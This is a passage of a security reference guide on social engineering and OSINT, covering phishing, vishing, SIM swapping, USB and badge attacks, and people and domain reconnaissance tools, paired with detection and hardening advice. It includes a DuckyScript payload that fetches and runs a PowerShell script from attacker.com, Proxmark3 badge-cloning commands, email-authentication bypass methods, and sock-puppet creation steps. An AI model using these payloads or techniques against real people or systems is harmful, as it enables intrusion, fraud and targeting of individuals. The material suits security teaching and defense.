# Domain 23 — Social Engineering and Open-Source Intelligence

> **Scope.** Social engineering: pretexting, spear-phishing (typosquatting, SPF/DKIM/DMARC bypass, Office macro payloads, HTML smuggling, ISO/IMG, OneNote, QR/quishing), MFA fatigue/push bombing, SIM swapping, vishing (caller ID spoofing, SIP trunks, SET, voice deepfakes, IVR phishing), BEC (CEO fraud, vendor compromise, conversation hijacking), consent phishing (OAuth), callback phishing (BazarCall), smishing, USB attacks (BadUSB, Rubber Ducky, Bash Bunny, OMG Cable, USBKill, USB Ninja), physical SE (tailgating, badge cloning, long-range RFID, dumpster diving, lock picking, impersonation), SE frameworks (Cialdini influence principles, cognitive biases, PTES SE section). OSINT: intelligence cycle (requirements → collection → processing → analysis → dissemination), OSINT framework taxonomy, passive vs active recon, sock puppet operations, practitioner OPSEC, domain/DNS recon (whois, dig, DNSDumpster, crt.sh, SecurityTrails, Amass, Subfinder, dnsx), subdomain enumeration (NSEC walking, massdns, SAN extraction, Google dorking), network scanning (masscan, ZMap, nmap NSE, Shodan/Censys/BinaryEdge), email recon (Hunter.io, theHarvester, phonebook.cz, Snov.io, HIBP), username enumeration (Sherlock, WhatsMyName, Maigret), breach data analysis (DeHashed, IntelX, h8mail), phone OSINT (Phoneinfoga, Truecaller), social media intelligence (LinkedIn Sales Navigator, Twitter/X operators, Facebook, Instagram, TikTok), image OSINT (EXIF, reverse search, geolocation), source code (GitHub org enum, .git exposure, git-dumper, truffleHog, Gitleaks, gitrob), Wayback Machine (gau, waybacking), dark web monitoring (.onion OSINT), tooling (Maltego, SpiderFoot, recon-ng, Harpoon, sn0int), physical OSINT (satellite/street imagery, OSM), Google/Shodan dorking (exact queries), technology fingerprinting (Wappalyzer, BuiltWith, WhatWeb). Counter-OSINT: digital footprint reduction, PII removal, metadata stripping (ExifTool, mat2), data broker opt-out, exposure monitoring. Awareness: phishing simulation KPIs, maturity models, tabletop exercises, red team SE rules of engagement.

---

## 1. Social engineering tactics

### 1.1 Pretexting

**Mechanism.** A pretext is a fabricated scenario giving the attacker a plausible reason to interact with the target and request information or access. It exploits Cialdini's authority and liking principles (§1.10): the target complies because the attacker appears to be someone with legitimate authority or a shared relationship. The pretext development lifecycle: **research** (gather information about the target — role, organization, vendors, communication patterns via OSINT §§3-4), **scenario construction** (design a scenario the target will find believable — "I'm from the IT help desk and need to verify your VPN credentials," "I'm the new vendor contact for your cloud migration project"), **artifact creation** (build supporting materials — a fake badge, a spoofed email address, a phone number showing the expected caller ID, a cloned corporate website), **execution** (engage the target via the chosen channel — phone, email, in-person), and **exploitation** (use the obtained information or access for the next stage of the attack).

The pretext must match the target's expectations: an IT help desk call is plausible for an employee; a vendor invoice is plausible for accounts-payable; a delivery person is plausible for a receptionist. Mismatches (wrong jargon, wrong process, wrong timing) break the pretext and alert the target.

**Detection indicators.** Unusual urgency or secrecy requests ("don't tell anyone"), requests that bypass normal process ("skip the ticket, just reset it now"), inability to answer verification questions, inconsistencies in organizational knowledge (wrong manager name, wrong building number), contact from unverifiable numbers or addresses.

**Hardening.** Mandatory callback verification for sensitive requests (call back on a known-good number, never the number the caller provides). Verbal authentication codes for phone-based identity verification. Process documentation that explicitly forbids bypassing steps under pressure. Awareness training with quarterly pretexting simulations.

### 1.2 Spear-phishing

Targeted phishing directed at specific individuals or organizations, using information gathered via OSINT.

**Typosquatting domain registration.** The attacker registers a domain that visually resembles the target organization's domain: `examp1e.com` (digit 1 for letter l), `exarnple.com` (rn for m), `example-corp.com` (added suffix), `exmple.com` (missing letter). The attacker sets up email on the typosquatted domain and sends phishing emails appearing to come from a legitimate address. Homograph attacks use internationalized domain names (IDN) with visually-similar Unicode characters: `exаmple.com` (Cyrillic а instead of Latin a) — these are rendered identically in many fonts but resolve to different domains.

Lookalike domain generation is automated with `dnstwist`:

```bash
# Generate all permutations of a target domain
dnstwist --registered example.com

# Include fuzzy hashing of web content to detect active phishing clones
dnstwist --registered --ssdeep --mxcheck example.com

# Output to CSV for bulk monitoring
dnstwist --registered --format csv example.com > lookalikes.csv

# GeoIP and WHOIS enrichment
dnstwist --registered --geoip --whois example.com
```

`dnstwist` generates permutations: addition (`examples.com`), bitsquatting (`dxample.com`), homoglyph (`exaⅿple.com`), hyphenation (`ex-ample.com`), insertion (`exaample.com`), omission (`examle.com`), repetition (`exammple.com`), replacement (`ezample.com`), subdomain (`ex.ample.com`), transposition (`exapmle.com`), vowel-swap (`exomple.com`), and dictionary words (`example-login.com`).

**SPF/DKIM/DMARC bypass.** SPF (Sender Policy Framework) specifies which IP addresses are authorized to send email for a domain. DKIM (DomainKeys Identified Mail) signs email headers/body with a domain key. DMARC (Domain-based Message Authentication, Reporting, and Conformance) ties SPF and DKIM together and specifies the policy (none, quarantine, reject) for messages that fail.

Bypass techniques: sending from a domain that has no SPF/DKIM/DMARC records (many newly-registered domains), exploiting misconfigured SPF records (`+all` — allows any IP, or overly-broad `include:` directives that encompass cloud providers the attacker can use), exploiting DKIM replay (capturing a legitimate DKIM-signed email and replaying it to a different recipient — the DKIM signature validates because the signed headers and body are unchanged), and exploiting DMARC relaxed alignment (`aspf=r` allows subdomain SPF alignment: `attacker.example.com` passes DMARC for `example.com` if the attacker controls a subdomain). Null-byte injection in the envelope `MAIL FROM` field can bypass some SPF parsers.

**Office macro payloads.** VBA macros in Word documents (`.docm`, `.doc`) execute when the user clicks "Enable Content" (macros disabled by default since Office 2007). Excel 4.0 macros (XLM — legacy macro language, stored in hidden sheets) were a popular evasion technique until Microsoft disabled them by default in 2022. Microsoft has progressively restricted these vectors: VBA macros in files from the internet are blocked by default (since April 2022), XLM macros are disabled by default (since January 2022), and ISO/IMG files now propagate Mark-of-the-Web (since November 2022).

**Modern payload delivery vectors.** HTML smuggling — embedding a Base64-encoded payload in an HTML attachment that constructs and downloads a file client-side via JavaScript, bypassing email gateway scanning because the payload is assembled in the browser, not present in the email. ISO/IMG lures — disk image files that mount as a virtual drive, containing malicious LNK/EXE files; bypassed MOTW until Nov 2022 patch. OneNote abuse — `.one` files with embedded scripts behind "Double click to view" overlays (Microsoft blocked embedded files in OneNote in April 2023). QR code phishing (quishing) — embedding a QR code in the email body or a PDF attachment; the QR code points to a credential-harvesting URL; this bypasses URL scanning in email gateways because the URL is encoded in an image, not in text/HTML.

**Detection.** Email gateway rules: flag emails from domains < 30 days old, flag mismatched envelope-from and header-from, flag HTML attachments with JavaScript `Blob`/`URL.createObjectURL` patterns (HTML smuggling), flag `.iso`/`.img`/`.one` attachments, flag emails containing QR codes without corresponding text URLs. DMARC aggregate reports (`rua=`) reveal unauthorized senders attempting to use the organization's domain.

**Real-world campaigns.** Nobelium (APT29) used HTML smuggling extensively in 2021-2022 campaigns against government targets. QakBot used OneNote attachments after Microsoft's macro restrictions. Star Blizzard (COLDRIVER) used PDF lures leading to credential-harvesting pages targeting NGOs and journalists (2023-2024).

### 1.3 MFA fatigue (push bombing)

**Mechanism.** The attacker has the target's username and password (from a credential breach, phishing, or credential stuffing). They initiate repeated login attempts, each triggering an MFA push notification to the target's authenticator app. The target — annoyed by the repeated prompts, confused, or hoping to make them stop — eventually approves one. This exploits the cognitive bias of learned helplessness and the authority trigger when the attacker supplements push bombing with a concurrent vishing call pretending to be IT support.

**Real-world incident.** The Uber breach (September 2022): the attacker (Lapsus$) obtained an Uber contractor's credentials from a dark-web marketplace, sent repeated MFA push notifications, then contacted the contractor on WhatsApp pretending to be Uber IT and told them to approve the notification. The contractor approved; the attacker gained VPN access to Uber's internal network, discovered a PowerShell script containing Thycotic privileged-access credentials, and accessed internal dashboards, Slack, HackerOne bug bounty reports, and cloud infrastructure.

**Detection.** Monitor for MFA request volume anomalies: >3 push notifications in 60 seconds for a single user without a successful authentication. Alert on MFA approval from a geographic location inconsistent with the user's normal pattern (impossible travel). SIEM correlation: multiple failed MFA attempts followed by a successful authentication from a different IP/device.

**Hardening.** Number-matching MFA (the app displays a number that the user must enter on the login screen — the user must be looking at both the app and the login screen). Phishing-resistant MFA (FIDO2/WebAuthn — no push notifications to approve). Rate-limiting MFA push attempts (blocking after 3 failed attempts with a 15-minute cooldown). Conditional Access policies that require managed-device compliance for sensitive applications.

### 1.4 SIM swapping

The attacker contacts the target's mobile carrier (via phone, in-store, or online portal) and convinces a representative to transfer the target's phone number to a new SIM card (controlled by the attacker). Social engineering tactics: pretexting as the account holder ("I lost my phone"), bribing carrier employees ($100-$1000 per swap is documented in DOJ indictments), or exploiting weak identity-verification processes. Some attacks target carrier internal tools directly — the Lapsus$ group bribed T-Mobile employees for access to internal SIM management systems.

Once the SIM is swapped, the attacker receives SMS messages (including SMS-based 2FA codes), phone calls, and can reset passwords for accounts tied to the phone number. The attack window is short (minutes to hours before the victim notices loss of service), but automated tooling can reset passwords and drain accounts rapidly.

**High-profile SIM-swap attacks.** Twitter CEO Jack Dorsey (2019 — attackers posted from his account). Cryptocurrency investors (2018-2024 — multiple cases totaling $100M+ in stolen crypto, including $24M stolen from Michael Terpin). SEC X/Twitter account (January 2024 — attackers posted a fake Bitcoin ETF approval, moving markets). FCC Commissioner Brendan Carr's phone number compromised (2024).

**Defense.** Carrier-side PIN/password on the account. Number-lock/port-freeze features (T-Mobile Account Takeover Protection, AT&T Number Lock, Verizon Number Lock). Migrate from SMS-based 2FA to FIDO2/app-based MFA for all critical accounts. Monitor for sudden loss of cellular service as an early indicator.

### 1.5 Vishing

Voice phishing: the attacker calls the target (or tricks the target into calling a fake number) and uses social engineering over the phone.

**Caller ID spoofing.** Using SIP trunks from VoIP providers, the attacker sets any caller ID (the SIP `From` header determines the displayed number). Some providers validate caller ID (STIR/SHAKEN attestation — certificate-based framework for verifying caller-ID authenticity), but adoption is incomplete and international calls are generally unverifiable. Tools: SIPVicious for SIP infrastructure testing, custom Asterisk PBX configurations for outbound spoofed calls.

**Pretexting techniques for vishing.** IT support impersonation ("We've detected suspicious activity on your account — I need to verify your identity and walk you through a password reset"). Vendor impersonation ("This is your cloud provider's support team — we need to verify your admin credentials to apply an emergency patch"). Executive impersonation ("This is the CFO — I need you to wire funds to this account immediately, I'm traveling and can't access the portal").

**Voice deepfake technology.** AI voice cloning tools (Bark, RVC/Retrieval-Based Voice Conversion, commercial voice cloning APIs) can produce convincing voice replicas from 3-10 seconds of sample audio (obtained from earnings calls, conference talks, YouTube videos, voicemail greetings). In 2024, a Hong Kong finance worker transferred $25.6M after a video call with deepfake replicas of the company's CFO and other executives. In 2023, attackers used AI-cloned voices to impersonate family members in "kidnapping" scams.

**IVR phishing.** The attacker sets up a fake Interactive Voice Response system mimicking a bank or service provider ("Press 1 for account support, press 2 for fraud reporting"). The victim calls the fake number (from a smishing message or a Google search result pointing to a fake contact page) and enters their account number, PIN, or SSN via the keypad. The IVR captures the DTMF tones.

**The Social Engineering Toolkit (SET).** An open-source penetration-testing framework that automates vishing and phishing infrastructure: IVR setup, web-page cloning for credential harvesting, payload generation, and mass-mailer integration.

**Detection.** STIR/SHAKEN attestation levels: A (full attestation — the carrier verified the caller), B (partial — the carrier verified the customer but not the specific number), C (gateway — the call originated from a gateway with no verification). Calls with C attestation from unexpected area codes warrant higher scrutiny. Employee-reported vishing attempts tracked as a KPI.

### 1.6 BEC (Business Email Compromise)

**CEO fraud.** The attacker impersonates the CEO via a spoofed or compromised email account and instructs an employee (typically in finance) to make an urgent wire transfer. The email conveys urgency ("this is confidential, do not discuss with anyone else") and authority ("I need this completed today"). FBI IC3 reports BEC losses exceeded $2.9 billion in 2023 in the US alone — making it the highest-dollar cybercrime category.

**Vendor email compromise.** The attacker compromises a vendor's email via phishing or credential theft and monitors threads related to invoicing. At the appropriate time, the attacker sends a modified invoice with the attacker's bank details from the vendor's compromised email. The Norfund attack (2020): Norwegian government investment fund lost $10M to a vendor email compromise — attackers monitored email for months, then substituted bank details on a legitimate disbursement.

**Conversation hijacking.** The attacker compromises one party's email, reads the ongoing conversation, and injects a reply at the right moment ("our bank details have changed, please use this new account for future payments"). Because the reply is in the context of a real thread (correct references, correct tone), the recipient has no reason to suspect fraud.

**Detection.** Email rules flagging: "wire transfer" + "urgent" + external sender. Mailbox forwarding rule audits (attackers often create hidden forwarding rules to `attacker@domain.com` after compromising an account — check with `Get-InboxRule` in Exchange Online). Anomalous login locations for email accounts. Financial controls: dual-authorization for wire transfers exceeding a threshold, mandatory callback verification to a known number for bank-detail changes.

### 1.7 Consent phishing (OAuth abuse)

Covered in Domain 14 Chapter 14B §5.2 (M365 OAuth consent grant). The attacker creates a malicious OAuth application (registered in any Azure AD tenant) and sends the target a link to the OAuth consent page. The page requests permissions (Mail.Read, Files.ReadWrite.All, etc.). If the target (or an admin, for admin-consent flows) approves, the attacker's application receives a long-lived token granting the requested permissions — persistent access without credentials.

**Storm-0324** and **Midnight Blizzard** used Teams-based consent phishing in 2023 — sending Teams messages with OAuth consent links from compromised tenants. Microsoft responded by restricting user consent to verified publishers.

**Hardening.** Restrict user consent to verified publishers only (`Set-MsolCompanySettings -UsersPermissionToUserConsentToAppEnabled $false`). Require admin consent for all third-party apps. Regular audit of consented apps via `Get-AzureADServicePrincipal`.

### 1.8 USB attacks

**BadUSB / Rubber Ducky.** A USB device that enumerates as a keyboard (HID — Human Interface Device) and types pre-programmed keystrokes at high speed. Within seconds of being plugged in, the device can open a command prompt, download and execute a payload, establish a reverse shell, and exfiltrate data. The Hak5 USB Rubber Ducky is the canonical implementation; DuckyScript is the payload language.

Example DuckyScript payload (reverse shell):

```
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
ENTER
```

**Bash Bunny.** A more advanced USB attack platform: enumerates as multiple USB device types simultaneously (keyboard + storage + Ethernet adapter), enabling complex attack flows (e.g., enumerating as an Ethernet adapter to MitM the host's network traffic while also typing keystrokes as a keyboard). Attack modes are switchable via a physical toggle. Payloads are written in Bash and stored on the Bunny's internal storage.

**OMG Cable / USB Ninja Cable.** A USB cable with an embedded microcontroller inside the connector housing. The cable functions normally for charging and data transfer but also enumerates a hidden HID interface. The attacker remotely triggers payload execution via Wi-Fi (the OMG Cable has an embedded Wi-Fi radio with a web-based management interface). The cable is visually indistinguishable from a legitimate cable. The OMG Keylogger variant captures and exfiltrates keystrokes typed through the cable.

**USBKill.** A USB device that charges its internal capacitors from the USB port's 5V supply, then discharges a high-voltage pulse (up to 220V) back into the USB port, physically destroying the USB controller and often the motherboard. Destructive DoS device — used in the 2019 College of Saint Rose attack where a student destroyed 66 computers.

**Defense.** USB device whitelisting (Windows Group Policy: `Administrative Templates > System > Device Installation > Device Installation Restrictions` — allow only approved USB VID/PIDs). Linux `usbguard` daemon for policy-based USB device authorization. Physical USB port locks/blockers. Endpoint detection for rapid HID enumeration (a keyboard that types 1000 WPM triggers an alert). User training — "if you find a USB drive, do not plug it in; turn it in to security."

### 1.9 Physical social engineering

**Tailgating/piggybacking.** Following an authorized person through a secured door without presenting credentials. The attacker carries boxes, pretends to be on the phone, or walks confidently behind the authorized person. Social engineering principle: people are reluctant to challenge someone who appears to belong. Defense: mantrap/airlock entries (only one person per door cycle), turnstiles with anti-passback, security guard presence, and awareness training with specific instruction to challenge unknown individuals politely.

**Badge cloning.** Many corporate access-control systems use 125 kHz proximity cards (HID Prox, EM4100) with no cryptographic protection. The card transmits a fixed ID when energized by the reader.

```bash
# Proxmark3 — read a 125 kHz HID Prox card
proxmark3> lf hid read

# Clone the card ID to a T5577 blank
proxmark3> lf hid clone -r 200670012345

# Long-range read with modified antenna (up to 1m+ with high-gain coil)
# The target walks past the concealed reader; the card ID is captured
proxmark3> lf hid watch
```

Defense: upgrade to 13.56 MHz cards with cryptographic mutual authentication (MIFARE DESFire EV2/EV3, iCLASS SE/SEOS, FIDO-based access). Multi-factor access (card + PIN). Encrypted card-reader communication (OSDP — Open Supervised Device Protocol with SCP03 encryption). Deploy card shielding sleeves for employees.

**USB drop attacks.** Scattering USB devices (branded with the target company's logo for plausibility) in parking lots, lobbies, break rooms. The 2016 University of Illinois study found that 48% of dropped USB drives were plugged in, and the first device was connected within 6 minutes.

**Impersonation techniques.** Delivery person (uniform, clipboard, package — gaining access to loading docks and mail rooms). IT technician (laptop bag, polo shirt with fake company branding, "I'm here to fix the printer on the 3rd floor"). Auditor/inspector (clipboard, lanyard, "I'm conducting the annual fire safety inspection"). The key is confidence, props, and knowledge of internal jargon/processes gathered via OSINT.

**Dumpster diving.** Searching discarded materials for sensitive information: organizational charts, internal memos, printed emails, sticky notes with passwords, discarded hard drives, network diagrams. Defense: cross-cut shredding policy (not strip-cut — strip-cut can be reassembled), locked dumpsters/recycling bins, secure media destruction procedures (NIST SP 800-88 guidelines).

**Lock picking for penetration testing.** The Open Organisation of Lockpickers (TOOOL) provides training and resources for security professionals. Common tools: pick set (hook, rake, diamond), tension wrench, bump key, electric pick gun. Used in physical penetration tests to demonstrate that locked doors/cabinets do not provide adequate security without additional controls.

### 1.10 Social engineering frameworks and psychology

**Cialdini's six principles of influence** (plus the seventh principle added in 2021):

1. **Reciprocity** — people feel obligated to return favors. The attacker provides something first (helpful information, a small gift, a solved problem) before making the request. "I noticed your VPN certificate was about to expire, so I renewed it. By the way, I need to verify your credentials to complete the process."
2. **Commitment and consistency** — once people commit to something, they are more likely to follow through. The attacker starts with a small request ("Can you confirm your department?") and escalates ("Great, now I just need your employee ID to complete the ticket").
3. **Social proof** — people follow what others do. "Everyone in your department has already completed this security verification."
4. **Authority** — people comply with authority figures. Impersonating IT, management, or law enforcement. Using official-sounding titles, jargon, and reference numbers.
5. **Liking** — people are more likely to comply with someone they like. Building rapport, finding common ground (gleaned from OSINT — same university, same hometown, same hobbies).
6. **Scarcity** — creating urgency. "This offer expires in 30 minutes," "Your account will be locked if you don't verify now."
7. **Unity** — shared identity. "As fellow members of the security team," "We're both parents, you understand."

**Cognitive biases exploited in SE:**

- **Anchoring** — the first piece of information sets the expectation. The attacker establishes a frame ("I'm calling from Microsoft support about the virus we detected on your computer") and subsequent information is evaluated against that anchor.
- **Bandwagon effect** — "Everyone else has already done this."
- **Confirmation bias** — the target interprets ambiguous information as confirming the pretext because they've already accepted the attacker's initial frame.
- **Authority bias** — deferring to perceived experts or authority figures.
- **Optimism bias** — "It won't happen to me" — why employees click phishing links despite training.

**PTES social engineering section.** The Penetration Testing Execution Standard defines the SE attack lifecycle: intelligence gathering (OSINT), pretext development, attack planning (channel selection, timing), execution, and reporting. PTES distinguishes between remote (phishing, vishing, smishing) and physical (tailgating, badge cloning, USB drops) vectors and provides a structured methodology for scoping and documenting SE engagements.

---

## 2. OSINT methodology

### 2.1 OSINT framework taxonomy

The OSINT Framework (osintframework.com) organizes collection techniques into categories: **username** (account discovery across platforms), **email** (address harvesting, verification, breach checking), **domain** (WHOIS, DNS, subdomains, reputation), **IP address** (geolocation, ASN, reverse DNS, blacklists), **social networks** (platform-specific search and analysis tools per network), **instant messaging** (Telegram, Discord, Signal OSINT), **people search** (public records, data brokers, electoral rolls), **phone** (carrier lookup, caller ID, reverse lookup), **business records** (SEC filings, corporate registrations, UBO registries), **geospatial** (satellite imagery, mapping, geolocation from images), **image/video** (reverse search, metadata, deepfake detection), **dark web** (Tor, I2P, paste sites, marketplaces), **financial** (cryptocurrency tracing, sanctions lists, payment processors), and **transportation** (flight tracking, vessel tracking, vehicle registrations). NATO defines OSINT collection disciplines as HUMINT-adjacent open sources, distinguishing OSINT from SIGINT, IMINT, and MASINT by source type, not by analytical method.

### 2.2 The intelligence cycle

OSINT follows the standard intelligence cycle used by military and civilian intelligence agencies:

1. **Requirements** — define what information is needed and why. What is the target? What decisions will the intelligence support? (E.g., "Identify all external-facing systems of TargetCorp to scope a penetration test" or "Build a target list for a phishing simulation.")
2. **Collection** — gather raw data from open sources. This is where OSINT tools operate (§§3-4).
3. **Processing** — convert raw data into usable format. Normalize data, deduplicate, translate, structure into databases or graphs.
4. **Analysis** — evaluate processed information for patterns, gaps, and significance. Correlate findings across sources. Assess reliability and confidence.
5. **Dissemination** — deliver finished intelligence to the consumer in the appropriate format (report, briefing, structured data feed).

### 2.3 Passive vs. active reconnaissance

**Passive reconnaissance** — no packets sent to the target, no interaction with target systems. The target cannot detect the reconnaissance. Sources: search engines, CT logs (crt.sh), DNS passive databases (SecurityTrails, PassiveTotal), Shodan/Censys (pre-indexed scans), social media, WHOIS, public records, breach databases, cached/archived pages (Wayback Machine). This is the default starting point for OSINT.

**Active reconnaissance** — direct interaction with target systems. Port scanning (nmap, masscan), directory brute-force, subdomain enumeration via DNS queries to the target's name servers, vulnerability scanning. The target can detect this activity via IDS/IPS, firewall logs, and rate-limiting. Active recon requires authorization in a penetration test scope.

### 2.4 Sock puppet creation and management

A sock puppet is a fictitious online identity used for OSINT collection, infiltrating communities, or social engineering. Operational requirements:

- **Aged accounts** — newly created accounts are flagged by platforms. Acquire or age accounts for 3-6 months with organic activity before operational use.
- **AI-generated personas** — profile photos generated with StyleGAN/DALL-E/Stable Diffusion (use thispersondoesnotexist.com or local generation). Ensure the generated face is not reverse-searchable (verify via Yandex/Google reverse image search). Generate a consistent backstory: name (via fakenamegenerator.com), employment history, education, interests.
- **Behavioral consistency** — maintain consistent posting patterns, time zones, interests, and writing style. Use a dedicated browser profile (Firefox Multi-Account Containers or separate Chromium profile) with a consistent VPN exit node matching the persona's claimed location.
- **Infrastructure isolation** — dedicated email (ProtonMail or Tutanota, not tied to real identity), dedicated phone number (virtual number via MySudo, Hushed, or prepaid SIM), dedicated browser/device. Never cross-contaminate sock puppet infrastructure with real identity.

### 2.5 Operational security for OSINT practitioners

- Use a VPN or Tor for all OSINT collection (leak of the practitioner's real IP to the target is a failure).
- Dedicated VM or hardware for OSINT work — Tails OS for high-sensitivity work, Buscador OSINT VM, or Trace Labs OSINT VM for structured environments.
- Never log into personal accounts on the OSINT workstation.
- Strip metadata from all files before sharing externally (`exiftool -all= file.jpg`, `mat2 file.pdf`).
- Document collection sources and timestamps (UTC ISO 8601) for chain-of-custody and reproducibility.
- Respect legal boundaries: CFAA (US), Computer Misuse Act (UK), GDPR (EU) — passive collection of publicly available data is generally lawful; accessing private systems or accounts is not.

---

## 3. People OSINT

### 3.1 Social media intelligence (SOCMINT)

**LinkedIn.** The primary source for organizational mapping. LinkedIn Sales Navigator provides advanced search filters: company, title, seniority, function, geography, years in role. Even without Sales Navigator, standard LinkedIn search combined with Google dorking is effective:

```
# Google dork for LinkedIn employee enumeration
site:linkedin.com/in "Example Corp" "current"
site:linkedin.com/in "Example Corp" "Chief Financial Officer"
site:linkedin.com/in "Example Corp" "system administrator"

# Technology stack from job postings
site:linkedin.com/jobs "Example Corp" ("Kubernetes" OR "Terraform" OR "AWS")
```

LinkedIn reveals: names, titles, departments, reporting structures, technologies used (from job descriptions and endorsements), employee tenures (useful for identifying recent joiners who may be less familiar with processes), organizational charts, and conference attendance (from activity feed).

**Twitter/X advanced search operators:**

```
# Tweets from a specific user mentioning a keyword
from:targetuser "password" OR "credentials" OR "api key"

# Tweets mentioning an organization within a date range
"Example Corp" since:2024-01-01 until:2024-12-31

# Geolocated tweets near a specific location
geocode:37.7749,-122.4194,5km

# Tweets with links from a domain
url:example.com

# Complaints or issues (useful for pretext development)
"Example Corp" ("locked out" OR "help desk" OR "can't login")
```

**Facebook.** Facebook Graph Search was deprecated, but Facebook search still supports: `People who work at Example Corp`, `People who live in [city] and work at Example Corp`. Facebook groups related to the target organization or industry provide pretext intelligence. Facebook posts with location check-ins reveal travel patterns and physical locations.

**Instagram location analysis.** Instagram posts tagged at the target's office location reveal: interior office layout (background details in photos), badge designs (worn visibly in photos), access points, security controls visible in backgrounds, and employee social connections. Use Instagram's location search or third-party tools to aggregate posts at specific coordinates.

**TikTok.** Employee-posted TikToks from office environments expose physical security details, internal culture, technology visible on screens, and organizational information. TikTok metadata in the JSON API response includes device model, carrier, and approximate geolocation.

### 3.2 Email address discovery

**Hunter.io:**

```bash
# API query for a domain's email pattern and addresses
curl "https://api.hunter.io/v2/domain-search?domain=example.com&api_key=YOUR_KEY"

# Verify a specific email address
curl "https://api.hunter.io/v2/email-verifier?email=john.doe@example.com&api_key=YOUR_KEY"
```

Hunter.io returns the email pattern (`first.last@`, `firstlast@`, `f.last@`), verified addresses, sources where the email was found, and confidence scores.

**theHarvester** — aggregates email addresses, subdomains, hostnames, and names from multiple sources:

```bash
# Comprehensive email harvest from multiple sources
theHarvester -d example.com -b all -l 500

# Specific source targeting
theHarvester -d example.com -b google,linkedin,dnsdumpster,crtsh

# Output to XML for further processing
theHarvester -d example.com -b all -f output.xml

# Using Shodan for host/banner discovery alongside email
theHarvester -d example.com -b shodan -l 200
```

**phonebook.cz** — free email/domain/URL search engine indexing billions of records from breach compilations, web scraping, and CT logs. No API needed — web interface at `phonebook.cz`.

**Snov.io** — email finder with LinkedIn integration, email verifier, and drip campaign capabilities. Combines email discovery with deliverability verification.

### 3.3 Username enumeration

**Sherlock** — checks username availability across 400+ social networks:

```bash
# Search for a username across all platforms
sherlock targetuser

# Limit to specific sites
sherlock targetuser --site twitter --site instagram --site github

# Output to file
sherlock targetuser --output results.txt

# Use Tor for anonymity
sherlock targetuser --tor

# Print only found accounts
sherlock targetuser --print-found
```

**Maigret** — enhanced fork of Sherlock with 2500+ sites, recursive username extraction, and report generation:

```bash
# Search with HTML report generation
maigret targetuser --html

# JSON output for parsing
maigret targetuser --json results.json

# Use specific site list
maigret targetuser --db custom_sites.json

# Search with Tor
maigret targetuser --tor

# Recursive — extract usernames from found profiles and search those too
maigret targetuser --recursive
```

**WhatsMyName** — username enumeration with a community-maintained list of 600+ sites, focusing on accuracy over breadth. Available as a web tool at `whatsmyname.app` and as a Python library.

### 3.4 Breach data analysis

**h8mail** — email-centric breach-data search:

```bash
# Search for breaches associated with an email
h8mail -t target@example.com

# Search with API keys for premium sources (HIBP, Snusbase, Leak-Lookup)
h8mail -t target@example.com -k apikeys.yaml

# Bulk search from a file
h8mail -t emails.txt -k apikeys.yaml

# Chase mode — find related emails in the same breaches
h8mail -t target@example.com --chase
```

**DeHashed** — searchable breach database (email, username, IP, name, phone, VIN, address). API access:

```bash
curl "https://api.dehashed.com/search?query=email:target@example.com" \
  -H "Accept: application/json" \
  -u email:api_key
```

**IntelX (Intelligence X)** — search engine for the deep/dark web, breach data, paste sites. Retains historical data that has been removed from public sources. API provides access to leaked credentials, paste content, and dark web mentions.

**HaveIBeenPwned domain search** — identifies which email addresses at a domain have appeared in data breaches, revealing valid email addresses and the breaches that may have exposed their passwords.

### 3.5 Phone number OSINT

**PhoneInfoga** — automated phone number information gathering:

```bash
# Scan a phone number
phoneinfoga scan -n "+1234567890"

# Serve the web interface for interactive investigation
phoneinfoga serve -p 8080

# Scan with all available scanners
phoneinfoga scan -n "+1234567890" --scanner all
```

PhoneInfoga validates the number format, identifies the carrier and line type (mobile/landline/VoIP), performs Google dorking for the number, and checks social media platforms.

**Truecaller** — reverse phone lookup API providing caller name, spam score, carrier, and operator details. Community-sourced database of billions of phone numbers. The Truecaller API requires a registered account; web scraping is against ToS but commonly performed by OSINT practitioners.

**Caller ID spoofing for voicemail access.** Some voicemail systems authenticate based on the caller's phone number (if you call from your own number, you're not prompted for a PIN). By spoofing the target's caller ID, an attacker can access the target's voicemail without a PIN. Defense: always set a voicemail PIN regardless of caller-ID authentication.

---

## 4. Infrastructure OSINT

### 4.1 Domain reconnaissance

**Amass** — comprehensive subdomain enumeration and network mapping:

```bash
# Passive enumeration only (no DNS queries to target)
amass enum -passive -d example.com -o subs_passive.txt

# Active enumeration with brute-force
amass enum -active -d example.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o subs_active.txt

# Enumerate with all sources, including API keys configured in ~/.config/amass/config.yaml
amass enum -d example.com -config ~/.config/amass/config.yaml

# Visualization — generate a network graph
amass viz -d example.com -graphistry

# Track changes over time
amass track -d example.com -dir ./amass_output

# Intel module — discover root domains from an organization name
amass intel -org "Example Corp"
```

Amass integrates with 50+ data sources: Censys, Shodan, SecurityTrails, VirusTotal, PassiveTotal, AlienVault OTX, CommonCrawl, Wayback Machine, and more. Configure API keys in `~/.config/amass/config.yaml` for maximum coverage.

**Subfinder** — fast passive subdomain enumeration:

```bash
# Basic subdomain enumeration
subfinder -d example.com -o subdomains.txt

# Use all configured sources
subfinder -d example.com -all -o subdomains.txt

# Silent mode — output only subdomains
subfinder -d example.com -silent

# Recursive enumeration
subfinder -d example.com -recursive

# Multiple domains from file
subfinder -dL domains.txt -o all_subdomains.txt

# JSON output with source attribution
subfinder -d example.com -json -o subdomains.json
```

**dnsx** — DNS toolkit for resolution, filtering, and probing:

```bash
# Resolve discovered subdomains to IPs
cat subdomains.txt | dnsx -a -resp -o resolved.txt

# Check for specific record types
cat subdomains.txt | dnsx -mx -cname -txt -resp

# Filter alive hosts
cat subdomains.txt | dnsx -a -resp-only | sort -u > live_ips.txt

# Reverse DNS lookup on an IP range
echo "192.168.1.0/24" | dnsx -ptr -resp

# Full pipeline: enumerate → resolve → filter
subfinder -d example.com -silent | dnsx -a -resp -silent | cut -d ' ' -f1 > alive_hosts.txt
```

**httpx** — HTTP probing and technology detection for discovered subdomains:

```bash
# Probe for live HTTP(S) services with status code and title
cat subdomains.txt | httpx -silent -status-code -title -o live_http.txt

# Technology detection
cat subdomains.txt | httpx -silent -tech-detect -o tech_fingerprint.txt

# Full recon pipeline: enumerate → resolve → probe → fingerprint
subfinder -d example.com -silent | dnsx -silent | httpx -silent -sc -title -td -server -ip

# Filter by status code
cat subdomains.txt | httpx -silent -mc 200,301,302,403 -o accessible.txt

# Extract response headers for analysis
cat subdomains.txt | httpx -silent -include-response-header -o headers.txt

# Screenshot all live web services
